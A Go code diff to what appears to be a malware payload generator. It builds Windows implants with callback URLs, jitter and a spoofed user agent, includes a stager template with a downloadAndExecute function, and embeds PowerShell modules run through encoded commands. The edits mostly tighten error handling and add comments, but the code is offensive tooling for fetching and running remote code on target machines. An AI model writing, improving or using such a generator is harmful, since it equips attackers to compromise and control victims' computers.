@@ -275,10 +275,12 @@ func (g *Generator) encryptPayload(data []byte, cfg *core.Config) ([]byte, error
 func compressData(data []byte) ([]byte, error) {
 	var buf bytes.Buffer
 	w := gzip.NewWriter(&buf)
+	
 	if _, err := w.Write(data); err != nil {
-		w.Close()
+		w.Close() // Cleanup on error
 		return nil, err
 	}
+	// Close() finalizes the gzip stream - must be called
 	if err := w.Close(); err != nil {
 		return nil, err
 	}
@@ -461,9 +463,12 @@ func (g *Generator) generateWindowsSource(opts Options) ([]byte, error) {
 	}
 
 	var source string
-	var err error
 	if opts.Type == "full" {
+		var err error
 		source, err = g.generateWindowsSourceFull(opts, callbackURL, delay, jitter, userAgent)
+		if err != nil {
+			return nil, err
+		}
 	} else {
 		// Stager template
 		stagerTemplate := `package main
@@ -516,9 +521,6 @@ func downloadAndExecute() {
 }
 `
 		source = fmt.Sprintf(stagerTemplate, callbackURL, userAgent)
-	}
-	if err != nil {
-		return nil, err
 	}
 	return []byte(source), nil
 }
@@ -1513,7 +1515,10 @@ func (g *Generator) embedModules(moduleIDs []string) string {
 		if module.Language == modules.LanguagePowerShell {
 			moduleCode.WriteString(fmt.Sprintf("// PowerShell module would be executed via powershell.exe\n"))
 			moduleCode.WriteString(fmt.Sprintf("cmd := exec.Command(\"powershell.exe\", \"-EncodedCommand\", base64.StdEncoding.EncodeToString([]byte(`%s`)))\n", script))
-			moduleCode.WriteString("output, _ := cmd.CombinedOutput()\n")
+			moduleCode.WriteString("output, err := cmd.CombinedOutput()\n")
+			moduleCode.WriteString("if err != nil {\n")
+			moduleCode.WriteString("return fmt.Sprintf(\"Module execution error: %%v\", err)\n")
+			moduleCode.WriteString("}\n")
 			moduleCode.WriteString("return string(output)\n")
 		} else {
 			moduleCode.WriteString(fmt.Sprintf("// Module script:\n%s\n", script))
